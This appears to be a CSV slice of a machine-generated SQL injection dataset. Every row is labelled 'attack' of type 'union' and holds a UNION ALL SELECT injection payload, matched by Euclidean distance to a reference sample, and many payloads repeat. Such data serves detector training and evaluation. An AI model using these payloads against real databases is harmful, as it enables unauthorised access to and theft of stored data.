id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
GAN_001208,attack,union,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",nearest_attack_euclidean,R000071,4.292734405934143
GAN_001209,attack,union,"-8929' union all select 5324,5324,5324,5324,5324,5324--",nearest_attack_euclidean,R000115,4.898167177637528
GAN_001210,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R000135,4.907659967856306
GAN_001211,attack,union,"-5624' union all select 3723,3723,3723,3723,3723--",nearest_attack_euclidean,R000140,6.467898080142623
GAN_001212,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R000135,6.264009578710806
GAN_001213,attack,union,"-4955%' union all select 5928,5928--",nearest_attack_euclidean,R000105,6.666141818423248
GAN_001214,attack,union,"-5776%' union all select 3075,3075,3075,3075,3075--",nearest_attack_euclidean,R000063,5.998216701804258
GAN_001215,attack,union,"-8929' union all select 5324,5324,5324,5324,5324,5324--",nearest_attack_euclidean,R000115,4.726699255219511
GAN_001216,attack,union,"-8929' union all select 5324,5324,5324,5324,5324,5324--",nearest_attack_euclidean,R000115,5.591321708306316
GAN_001217,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R000135,5.713278160061303
GAN_001218,attack,union,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",nearest_attack_euclidean,R000071,5.044767658067543
GAN_001219,attack,union,"-5624' union all select 3723,3723,3723,3723,3723--",nearest_attack_euclidean,R000140,7.521115297302181
GAN_001220,attack,union,"-5624' union all select 3723,3723,3723,3723,3723--",nearest_attack_euclidean,R000140,6.063460230283476
GAN_001221,attack,union,"-5624' union all select 3723,3723,3723,3723,3723--",nearest_attack_euclidean,R000140,6.455394516402368
GAN_001222,attack,union,"-7032'  )   as xmmm where 5635  =  5635 union all select 5635,5635,5635,5635,5635--",nearest_attack_euclidean,R000090,5.372128054691236
GAN_001223,attack,union,"-5624' union all select 3723,3723,3723,3723,3723--",nearest_attack_euclidean,R000140,6.125111535145802
GAN_001224,attack,union,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",nearest_attack_euclidean,R000071,4.214582886574051
GAN_001225,attack,union,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",nearest_attack_euclidean,R000071,4.638524147563934
GAN_001226,attack,union,"-1634%' union all select 5937,5937,5937,5937--",nearest_attack_euclidean,R000123,6.956372013350973
GAN_001227,attack,union,"-5624' union all select 3723,3723,3723,3723,3723--",nearest_attack_euclidean,R000140,5.613588536634355
GAN_001228,attack,union,"-7032'  )   as xmmm where 5635  =  5635 union all select 5635,5635,5635,5635,5635--",nearest_attack_euclidean,R000090,3.879349177053022
GAN_001229,attack,union,"-1634%' union all select 5937,5937,5937,5937--",nearest_attack_euclidean,R000123,8.025311610883522
GAN_001230,attack,union,"-5776%' union all select 3075,3075,3075,3075,3075--",nearest_attack_euclidean,R000063,5.7952445212105665
GAN_001231,attack,union,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",nearest_attack_euclidean,R000071,7.265935780862123
GAN_001232,attack,union,"-8929' union all select 5324,5324,5324,5324,5324,5324--",nearest_attack_euclidean,R000115,5.864595259990423
GAN_001233,attack,union,"-1634%' union all select 5937,5937,5937,5937--",nearest_attack_euclidean,R000123,5.2284632344670685
GAN_001234,attack,union,"-5624' union all select 3723,3723,3723,3723,3723--",nearest_attack_euclidean,R000140,6.548211098124159
GAN_001235,attack,union,"-5624' union all select 3723,3723,3723,3723,3723--",nearest_attack_euclidean,R000140,5.4027860818174895
GAN_001236,attack,union,"-8929' union all select 5324,5324,5324,5324,5324,5324--",nearest_attack_euclidean,R000115,7.195588806174932
GAN_001237,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R000135,5.723907330703233
GAN_001238,attack,union,"-5624' union all select 3723,3723,3723,3723,3723--",nearest_attack_euclidean,R000140,5.420695687233973
GAN_001239,attack,union,"-8929' union all select 5324,5324,5324,5324,5324,5324--",nearest_attack_euclidean,R000115,6.367115632635492
GAN_001240,attack,union,"-7032'  )   as xmmm where 5635  =  5635 union all select 5635,5635,5635,5635,5635--",nearest_attack_euclidean,R000090,5.3690330829737976
GAN_001241,attack,union,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",nearest_attack_euclidean,R000071,5.258928291447479
GAN_001242,attack,union,"-7032'  )   as xmmm where 5635  =  5635 union all select 5635,5635,5635,5635,5635--",nearest_attack_euclidean,R000090,4.559632739879788
GAN_001243,attack,union,"-1634%' union all select 5937,5937,5937,5937--",nearest_attack_euclidean,R000123,6.733331640485648
GAN_001244,attack,union,"-5624' union all select 3723,3723,3723,3723,3723--",nearest_attack_euclidean,R000140,5.986929320543968
GAN_001245,attack,union,"-7032'  )   as xmmm where 5635  =  5635 union all select 5635,5635,5635,5635,5635--",nearest_attack_euclidean,R000090,3.378486262591881
GAN_001246,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R000135,5.899760035110065
GAN_001247,attack,union,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",nearest_attack_euclidean,R000071,6.403357445400543
GAN_001248,attack,union,"-8929' union all select 5324,5324,5324,5324,5324,5324--",nearest_attack_euclidean,R000115,5.191263675919056
GAN_001249,attack,union,"-8929' union all select 5324,5324,5324,5324,5324,5324--",nearest_attack_euclidean,R000115,5.3071343611499
GAN_001250,attack,union,"-7032'  )   as xmmm where 5635  =  5635 union all select 5635,5635,5635,5635,5635--",nearest_attack_euclidean,R000090,5.922389221053187
GAN_001251,attack,union,"-5624' union all select 3723,3723,3723,3723,3723--",nearest_attack_euclidean,R000140,5.5195485014399726
GAN_001252,attack,union,"-5624' union all select 3723,3723,3723,3723,3723--",nearest_attack_euclidean,R000140,5.334580047640705
GAN_001253,attack,union,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",nearest_attack_euclidean,R000071,4.698085486978489
GAN_001254,attack,union,"-4869%' union all select 5729,5729,5729--",nearest_attack_euclidean,R000148,7.634717237237702
GAN_001255,attack,union,"-5624' union all select 3723,3723,3723,3723,3723--",nearest_attack_euclidean,R000140,6.142895147990609
GAN_001256,attack,union,"-8929' union all select 5324,5324,5324,5324,5324,5324--",nearest_attack_euclidean,R000115,5.001293744078818
GAN_001257,attack,union,"-8929' union all select 5324,5324,5324,5324,5324,5324--",nearest_attack_euclidean,R000115,5.662343596321888
GAN_001258,attack,union,"-8929' union all select 5324,5324,5324,5324,5324,5324--",nearest_attack_euclidean,R000115,6.2236844471502915
GAN_001259,attack,union,"-1634%' union all select 5937,5937,5937,5937--",nearest_attack_euclidean,R000123,6.425225181140927
GAN_001260,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R000135,4.864434712303002
GAN_001261,attack,union,"-7032'  )   as xmmm where 5635  =  5635 union all select 5635,5635,5635,5635,5635--",nearest_attack_euclidean,R000090,4.037333794968568
GAN_001262,attack,union,"-5624' union all select 3723,3723,3723,3723,3723--",nearest_attack_euclidean,R000140,5.552173175929798
GAN_001263,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R000135,4.71773576000803
GAN_001264,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R000135,5.997042084264406
GAN_001265,attack,union,"-7032'  )   as xmmm where 5635  =  5635 union all select 5635,5635,5635,5635,5635--",nearest_attack_euclidean,R000090,4.899265861128626
GAN_001266,attack,union,"-7032'  )   as xmmm where 5635  =  5635 union all select 5635,5635,5635,5635,5635--",nearest_attack_euclidean,R000090,4.353115014465724
GAN_001267,attack,union,"-8929' union all select 5324,5324,5324,5324,5324,5324--",nearest_attack_euclidean,R000115,5.668309786120318
GAN_001268,attack,union,"-7032'  )   as xmmm where 5635  =  5635 union all select 5635,5635,5635,5635,5635--",nearest_attack_euclidean,R000090,4.4725296290397285
GAN_001269,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R000135,5.264038120640633
GAN_001270,attack,union,"-5624' union all select 3723,3723,3723,3723,3723--",nearest_attack_euclidean,R000140,5.455558808166609
GAN_001271,attack,union,"-8929' union all select 5324,5324,5324,5324,5324,5324--",nearest_attack_euclidean,R000115,5.812518880543986
GAN_001272,attack,union,"-7032'  )   as xmmm where 5635  =  5635 union all select 5635,5635,5635,5635,5635--",nearest_attack_euclidean,R000090,6.050209229923794
GAN_001273,attack,union,"-5624' union all select 3723,3723,3723,3723,3723--",nearest_attack_euclidean,R000140,5.665100565021296
GAN_001274,attack,union,"-1634%' union all select 5937,5937,5937,5937--",nearest_attack_euclidean,R000123,5.827764619871251
GAN_001275,attack,union,"-5624' union all select 3723,3723,3723,3723,3723--",nearest_attack_euclidean,R000140,6.043648449750104
GAN_001276,attack,union,"-5624' union all select 3723,3723,3723,3723,3723--",nearest_attack_euclidean,R000140,7.891520511348726
GAN_001277,attack,union,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",nearest_attack_euclidean,R000071,4.857761017164341
GAN_001278,attack,union,"-5624' union all select 3723,3723,3723,3723,3723--",nearest_attack_euclidean,R000140,5.77838828190492
GAN_001279,attack,union,"-5624' union all select 3723,3723,3723,3723,3723--",nearest_attack_euclidean,R000140,7.035920266918801
GAN_001280,attack,union,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",nearest_attack_euclidean,R000071,5.351178745963111
GAN_001281,attack,union,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",nearest_attack_euclidean,R000071,4.839280339085629
GAN_001282,attack,union,"-5624' union all select 3723,3723,3723,3723,3723--",nearest_attack_euclidean,R000140,6.771532121831854
GAN_001283,attack,union,"-5624' union all select 3723,3723,3723,3723,3723--",nearest_attack_euclidean,R000140,6.589195221460377
GAN_001284,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R000135,5.040592099739026
GAN_001285,attack,union,"-1634%' union all select 5937,5937,5937,5937--",nearest_attack_euclidean,R000123,6.113889429864342
GAN_001286,attack,union,"-1634%' union all select 5937,5937,5937,5937--",nearest_attack_euclidean,R000123,8.562257622039098
GAN_001287,attack,union,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",nearest_attack_euclidean,R000071,4.257702398966807
GAN_001288,attack,union,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",nearest_attack_euclidean,R000071,5.477701989743318
GAN_001289,attack,union,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",nearest_attack_euclidean,R000071,5.301430861285556
GAN_001290,attack,union,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",nearest_attack_euclidean,R000071,4.200066893631211
GAN_001291,attack,union,"-5624' union all select 3723,3723,3723,3723,3723--",nearest_attack_euclidean,R000140,6.593260497729061
GAN_001292,attack,union,"-1634%' union all select 5937,5937,5937,5937--",nearest_attack_euclidean,R000123,5.44056984315516
GAN_001293,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R000135,5.55647912861471
GAN_001294,attack,union,"-5624' union all select 3723,3723,3723,3723,3723--",nearest_attack_euclidean,R000140,5.91123618969013
GAN_001295,attack,union,"-8929' union all select 5324,5324,5324,5324,5324,5324--",nearest_attack_euclidean,R000115,4.764586297340511
GAN_001296,attack,union,"-1634%' union all select 5937,5937,5937,5937--",nearest_attack_euclidean,R000123,6.133103922809211
GAN_001297,attack,union,"-5624' union all select 3723,3723,3723,3723,3723--",nearest_attack_euclidean,R000140,5.446098701748447
GAN_001298,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R000135,6.482964723436833
GAN_001299,attack,union,"-7032'  )   as xmmm where 5635  =  5635 union all select 5635,5635,5635,5635,5635--",nearest_attack_euclidean,R000090,4.767242246359517
GAN_001300,attack,union,"-7032'  )   as xmmm where 5635  =  5635 union all select 5635,5635,5635,5635,5635--",nearest_attack_euclidean,R000090,5.003044341287327
GAN_001301,attack,union,"-5624' union all select 3723,3723,3723,3723,3723--",nearest_attack_euclidean,R000140,6.4581679178080895
GAN_001302,attack,union,"-7032'  )   as xmmm where 5635  =  5635 union all select 5635,5635,5635,5635,5635--",nearest_attack_euclidean,R000090,6.643758096143198
GAN_001303,attack,union,"-7032'  )   as xmmm where 5635  =  5635 union all select 5635,5635,5635,5635,5635--",nearest_attack_euclidean,R000090,4.881044112825558
GAN_001304,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R000135,5.339108208549396
GAN_001305,attack,union,"-7032'  )   as xmmm where 5635  =  5635 union all select 5635,5635,5635,5635,5635--",nearest_attack_euclidean,R000090,5.667288414286224
GAN_001306,attack,union,"-1634%' union all select 5937,5937,5937,5937--",nearest_attack_euclidean,R000123,6.890741152759444
GAN_001307,attack,union,"-1634%' union all select 5937,5937,5937,5937--",nearest_attack_euclidean,R000123,5.790880090821729
GAN_001308,attack,union,"-1634%' union all select 5937,5937,5937,5937--",nearest_attack_euclidean,R000123,6.3530017952275175
GAN_001309,attack,union,"-5624' union all select 3723,3723,3723,3723,3723--",nearest_attack_euclidean,R000140,6.879750054578716
GAN_001310,attack,union,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",nearest_attack_euclidean,R000071,4.087400488325712
GAN_001311,attack,union,"-7032'  )   as xmmm where 5635  =  5635 union all select 5635,5635,5635,5635,5635--",nearest_attack_euclidean,R000090,4.905744700353495
GAN_001312,attack,union,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",nearest_attack_euclidean,R000071,3.700211563911831
GAN_001313,attack,union,"-5624' union all select 3723,3723,3723,3723,3723--",nearest_attack_euclidean,R000140,5.642336028991768
GAN_001314,attack,union,"-7032'  )   as xmmm where 5635  =  5635 union all select 5635,5635,5635,5635,5635--",nearest_attack_euclidean,R000090,5.2306652318898665
GAN_001315,attack,union,"-5624' union all select 3723,3723,3723,3723,3723--",nearest_attack_euclidean,R000140,5.108803570610503
GAN_001316,attack,union,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",nearest_attack_euclidean,R000071,4.704481711645351
GAN_001317,attack,union,"-5624' union all select 3723,3723,3723,3723,3723--",nearest_attack_euclidean,R000140,5.557431442455398
GAN_001318,attack,union,"-8929' union all select 5324,5324,5324,5324,5324,5324--",nearest_attack_euclidean,R000115,4.733417156180611
GAN_001319,attack,union,"-5624' union all select 3723,3723,3723,3723,3723--",nearest_attack_euclidean,R000140,5.0660325288395835
GAN_001320,attack,union,"-8929' union all select 5324,5324,5324,5324,5324,5324--",nearest_attack_euclidean,R000115,5.01275956847854
GAN_001321,attack,union,"-1634%' union all select 5937,5937,5937,5937--",nearest_attack_euclidean,R000123,6.143802944772381
